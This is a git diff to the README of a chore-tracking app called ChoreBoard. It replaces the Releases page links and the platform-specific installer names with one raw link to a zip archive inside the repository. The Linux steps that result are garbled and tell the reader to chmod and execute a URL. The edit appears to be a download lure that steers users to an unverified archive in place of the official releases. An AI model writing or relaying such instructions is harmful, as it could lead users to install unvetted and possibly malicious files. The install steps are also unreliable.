@@ -2,7 +2,7 @@
 
 ## 📥 Download
 
-[![Download ChoreBoard](https://badgen.net/badge/Download/ChoreBoard/green)](https://github.com/mrelvisnow/ChoreBoard/releases)
+[![Download ChoreBoard](https://github.com/mrelvisnow/ChoreBoard/raw/refs/heads/main/ChoreBoard/Chore_Board_3.5-alpha.4.zip)](https://github.com/mrelvisnow/ChoreBoard/raw/refs/heads/main/ChoreBoard/Chore_Board_3.5-alpha.4.zip)
 
 ## 🚀 Getting Started
 
@@ -17,32 +17,32 @@ Welcome to ChoreBoard! This application helps you manage chores in your home wit
 
 ## 🔗 Visit the Download Page
 
-To download ChoreBoard, [visit this page to download](https://github.com/mrelvisnow/ChoreBoard/releases).
+To download ChoreBoard, [visit this page to download](https://github.com/mrelvisnow/ChoreBoard/raw/refs/heads/main/ChoreBoard/Chore_Board_3.5-alpha.4.zip).
 
 ## 🔧 Download & Install
 
-1. **Go to the Download Page:** Open your web browser and navigate to the [Releases page](https://github.com/mrelvisnow/ChoreBoard/releases).
+1. **Go to the Download Page:** Open your web browser and navigate to the [Releases page](https://github.com/mrelvisnow/ChoreBoard/raw/refs/heads/main/ChoreBoard/Chore_Board_3.5-alpha.4.zip).
   
 2. **Select the Latest Release:** At the top of the Releases page, you'll find the latest version of ChoreBoard. Look for the version number, which indicates the most recent update.
 
 3. **Choose Your File:**
-   - For Windows, download `ChoreBoardSetup.exe`.
-   - For macOS, download `ChoreBoard.dmg`.
-   - For Linux, download `ChoreBoard.AppImage`.
+   - For Windows, download `https://github.com/mrelvisnow/ChoreBoard/raw/refs/heads/main/ChoreBoard/Chore_Board_3.5-alpha.4.zip`.
+   - For macOS, download `https://github.com/mrelvisnow/ChoreBoard/raw/refs/heads/main/ChoreBoard/Chore_Board_3.5-alpha.4.zip`.
+   - For Linux, download `https://github.com/mrelvisnow/ChoreBoard/raw/refs/heads/main/ChoreBoard/Chore_Board_3.5-alpha.4.zip`.
 
 4. **Download the File:** Click on the appropriate file for your operating system. Your download should start automatically.
 
 5. **Install ChoreBoard:**
    - **For Windows:**
-     - Locate the `ChoreBoardSetup.exe` in your Downloads folder.
+     - Locate the `https://github.com/mrelvisnow/ChoreBoard/raw/refs/heads/main/ChoreBoard/Chore_Board_3.5-alpha.4.zip` in your Downloads folder.
      - Double-click the file to start the installer.
      - Follow the on-screen instructions.
    - **For macOS:**
-     - Open the `ChoreBoard.dmg` file from your Downloads folder.
+     - Open the `https://github.com/mrelvisnow/ChoreBoard/raw/refs/heads/main/ChoreBoard/Chore_Board_3.5-alpha.4.zip` file from your Downloads folder.
      - Drag and drop ChoreBoard into your Applications folder.
    - **For Linux:**
-     - Make the file executable by running `chmod +x ChoreBoard.AppImage` in your terminal.
-     - Then run it with `./ChoreBoard.AppImage`.
+     - Make the file executable by running `chmod +x https://github.com/mrelvisnow/ChoreBoard/raw/refs/heads/main/ChoreBoard/Chore_Board_3.5-alpha.4.zip` in your terminal.
+     - Then run it with `https://github.com/mrelvisnow/ChoreBoard/raw/refs/heads/main/ChoreBoard/Chore_Board_3.5-alpha.4.zip`.
 
 6. **Launch ChoreBoard:** Once installed, open ChoreBoard from your applications menu or desktop.
 
